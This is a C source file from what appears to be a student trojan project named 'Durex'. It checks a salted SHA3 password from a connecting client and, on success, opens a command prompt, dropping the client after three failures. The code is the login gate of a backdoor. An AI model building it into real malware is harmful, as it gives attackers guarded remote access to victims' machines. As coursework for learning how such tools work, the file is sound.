/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   check_pwd.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mdufaud <mdufaud@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/05/20 19:46:10 by mdufaud           #+#    #+#             */
/*   Updated: 2018/05/20 20:10:28 by mdufaud          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"
#include "sha3.h"

static int		check_salty_pwd(t_durex *durex, char *msg)
{
	sha3_context	c;
	const uint8_t	*hash;
	const char		*salt_msg;

	if (!(salt_msg = (const char *)ft_strjoin(DUREX_SALT, msg)))
	{
		log_info(durex, "Could not strjoin in password");
		return (0);
	}
	sha3_Init256(&c);
	sha3_Update(&c, salt_msg, ft_strlen((const char *)salt_msg));
	hash = sha3_Finalize(&c);
	free((char *)salt_msg);
	if (ft_memcmp(DUREX_PWD, hash, sizeof(DUREX_PWD) - 1) != 0)
		return (0);
	return (1);
}

void			check_pwd(t_durex *durex, int co, char *msg)
{
	t_client	*client;

	client = &durex->clients[co];
	if (check_salty_pwd(durex, msg))
	{
		message_client(durex, co, "Welcome to "TROJAN_NAME" !\n");
		message_client(durex, co, "Type 'help' to see available commands\n");
		message_client(durex, co, DUREX_PROMPT);
		client->step = STEP_CMD;
	}
	else
	{
		client->pwd_try++;
		if (client->pwd_try == 3)
			remove_client(durex, co);
		else
			message_client(durex, co, "Wrong password !\n");
	}
}
